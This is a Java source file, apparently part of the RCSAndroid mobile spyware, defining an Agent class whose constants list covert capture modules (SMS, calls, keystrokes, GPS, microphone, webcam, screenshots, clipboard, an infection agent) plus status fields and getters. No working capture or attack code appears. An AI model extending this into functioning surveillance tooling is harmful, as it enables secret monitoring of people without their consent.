/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

public class Agent {
	/**
	 * Agents definitions
	 */
	public static int  AGENT = 0x1000;
	public static int  AGENT_SMS         = AGENT + 0x1;		// Agente di cattura delle Email/Sms/Mms
	public static int  AGENT_TASK        = AGENT + 0x2;		// Agente per la cattura degli appuntamenti 
	public static int  AGENT_CALLLIST    = AGENT + 0x3;		// Agente per la cattura della lista delle chiamate
	public static int  AGENT_DEVICE      = AGENT + 0x4;		// Agente per la cattura delle informazioni sul device
	public static int  AGENT_POSITION    = AGENT + 0x5;		// Agente per la cattura della posizione GPSo celle GSM
	public static int  AGENT_CALL        = AGENT + 0x6;		// Agente per la cattura delle chiamate con conference call
	public static int  AGENT_CALL_LOCAL  = AGENT + 0x7;		// Agente per la registrazione in situ delle chiamate
	public static int  AGENT_KEYLOG      = AGENT + 0x8;		// Agente per la cattura dei tasti battuti su tastiera
	public static int  AGENT_SNAPSHOT    = AGENT + 0x9;		// Agente per la cattura degli snapshot dello schermo
	public static int  AGENT_URL         = AGENT + 0xa;		// Agente per la cattura degli URL visitati
	public static int  AGENT_IM          = AGENT + 0xb;		// Agente per la cattura degli IM
	public static int  AGENT_EMAIL       = AGENT + 0xc;		// Non utilizzato (fa tutto AGENT_SMS)
	public static int  AGENT_MIC         = AGENT + 0xd;		// Agente per la cattura del microfono
	public static int  AGENT_CAM         = AGENT + 0xe;		// Agente per la cattura degli snapshot dalle webcam
	public static int  AGENT_CLIPBOARD   = AGENT + 0xf;		// Agente per la cattura degli appunti
	public static int  AGENT_CRISIS      = AGENT + 0x10;	// Agente di Crisis
	public static int  AGENT_APPLICATION = AGENT + 0x11;  	// Agente per la cattura delle applicazioni avviate o fermate
	public static int  AGENT_PDA         = 0xDF7A; 		    // Solo per PC (infection agent)

	/**
	 * Agent status definitions
	 */
	final public static int AGENT_DISABLED = 0x1;
	final public static int AGENT_ENABLED  = 0x2;
	final public static int AGENT_RUNNING  = 0x3;
	final public static int AGENT_STOPPED  = 0x4;

	final public static int AGENT_STOP      = AGENT_STOPPED;
	final public static int AGENT_RELOAD    = 0x1;
	final public static int AGENT_ROTATE    = 0x2;
	
	/**
	 * Agent ID
	 */
	private int agentId;

	/**
	 * Agent status: enabled, disabled, running, stopped
	 */
	private int agentStatus;

	/**
	 * Parameters
	 */
	private byte[] agentParams;

	public Agent(int id, int status, byte[] params) {
		this.agentId = id;
		this.agentStatus = status;
		this.agentParams = params;
	}

	int getId() {
		return this.agentId;
	}

	int getStatus() {
		return this.agentStatus;
	}

	void stopAgent() {
		this.agentStatus = AGENT_STOPPED;
	}

	byte[] getParams() {
		return this.agentParams;
	}
}